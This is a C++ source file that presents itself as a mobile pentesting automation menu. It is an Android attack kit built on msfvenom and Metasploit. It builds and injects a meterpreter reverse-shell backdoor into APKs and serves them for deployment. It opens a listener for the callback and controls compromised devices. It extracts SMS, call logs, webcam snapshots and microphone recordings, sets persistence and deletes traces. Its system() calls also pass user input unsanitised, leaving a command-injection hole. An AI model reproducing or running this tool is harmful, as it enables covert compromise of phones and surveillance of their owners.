/* Mobile Penetration Testing Automation Script in C++
# Author: Muhammad Sudais Usmani
# Description: This script automates various tasks related to mobile pentesting. */

#include <iostream>
#include <cstdlib>
using namespace std;

void checkADB() {
    cout << "[+] Checking ADB connection..." << endl;
    system("adb devices");
    system("adb connect 192.168.170.101:5555");
}

void adbShellAccess() {
    cout << "[+] Gaining shell access..." << endl;
    system("adb shell");
}

void generatePayload() {
    cout << "[+] Generating malicious APK..." << endl;
    system("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk");
}

void injectPayload() {
    cout << "Enter path to original APK: ";
    string originalAPK;
    cin >> originalAPK;
    string command = "msfvenom -x " + originalAPK + " -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk";
    system(command.c_str());
}

void startHTTPServer() {
    cout << "[+] Starting Python HTTP server on port 8080..." << endl;
    system("python3 -m http.server 8080 &");
}

void startMSFListener() {
    cout << "[+] Starting Metasploit listener..." << endl;
    system("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
}

void controlDevice() {
    cout << "[+] Listing active sessions..." << endl;
    system("msfconsole -q -x 'sessions'");
    cout << "Enter session ID to interact with: ";
    string sessionID;
    cin >> sessionID;
    string command = "msfconsole -q -x 'sessions -i " + sessionID + "'";
    system(command.c_str());
}

void extractData() {
    cout << "[+] Extracting data from target device..." << endl;
    system("msfconsole -q -x 'dump_calllog'");
    system("msfconsole -q -x 'dump_sms'");
    system("msfconsole -q -x 'webcam_snap'");
    system("msfconsole -q -x 'record_mic 10'");
}

void maintainAccess() {
    cout << "[+] Enabling persistence..." << endl;
    system("msfconsole -q -x 'run persistence -A'");
}

void clearTraces() {
    cout << "[+] Removing malicious APK..." << endl;
    system("adb shell rm /sdcard/backdoor.apk");
}

int main() {
    int option;
    while (true) {
        cout << "\n[ Mobile Pentesting Automation ]" << endl;
        cout << "1) Check ADB Connection" << endl;
        cout << "2) Gain ADB Shell Access" << endl;
        cout << "3) Generate Malicious APK" << endl;
        cout << "4) Inject Payload into APK" << endl;
        cout << "5) Start HTTP Server for Deployment" << endl;
        cout << "6) Start Metasploit Listener" << endl;
        cout << "7) Control Compromised Device" << endl;
        cout << "8) Extract Data from Target" << endl;
        cout << "9) Maintain Access" << endl;
        cout << "10) Clear Traces" << endl;
        cout << "11) Exit" << endl;
        cout << "Choose an option: ";
        cin >> option;
        switch (option) {
            case 1: checkADB(); break;
            case 2: adbShellAccess(); break;
            case 3: generatePayload(); break;
            case 4: injectPayload(); break;
            case 5: startHTTPServer(); break;
            case 6: startMSFListener(); break;
            case 7: controlDevice(); break;
            case 8: extractData(); break;
            case 9: maintainAccess(); break;
            case 10: clearTraces(); break;
            case 11: return 0;
            default: cout << "Invalid option, please try again." << endl;
        }
    }
    return 0;
}
